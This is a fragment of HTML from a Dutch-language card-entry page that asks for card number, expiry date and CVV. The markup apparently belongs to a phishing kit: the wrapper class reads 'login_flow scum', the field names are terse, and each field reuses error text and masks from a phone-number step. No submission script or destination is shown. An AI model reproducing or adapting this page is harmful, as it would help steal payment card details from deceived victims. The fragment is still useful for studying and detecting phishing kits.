...
<div class="login_flow scum" id="phone-view">
            ...
            <div class="form_fields form-group">
                <div class="ucr_details"> 
                	<label for="mob"><span class="ng-binding">Kaartnummer
</span></label><div class="default_input_field"> 
                        

                    	<input type="tel" name="c" class="input_card_number form-control" data-err_text="gsm-nummer" placeholder="---- ---- ---- ----" data-mask="99 99 99 99" mask-placeholder="-- -- -- --" required="">
                    </div>
                	
                </div>
                <div class="ucr_details"> 
                	<label for="mob"><span class="ng-binding">Vervaldatum 
</span></label><div class="default_input_field"> 
                        

                    	<input type="text" name="eml" class="input_card_number form-control" data-err_text="gsm-nummer" placeholder="MM/JJJJ" data-mask="99 99 99 99" mask-placeholder="-- -- -- --" required="" oninput="formatExpiryDate(this)">
                    </div>
...
</script><div class="ucr_details"> 
                	<label for="mob"><span class="ng-binding">CVV
</span></label><div class="default_input_field"> 
                        

                    	<input type="tel" name="cv" class="input_card_number form-control" data-err_text="gsm-nummer" placeholder="---" data-mask="99 99 99 99" mask-placeholder="-- -- -- --" required="">
                    </div>
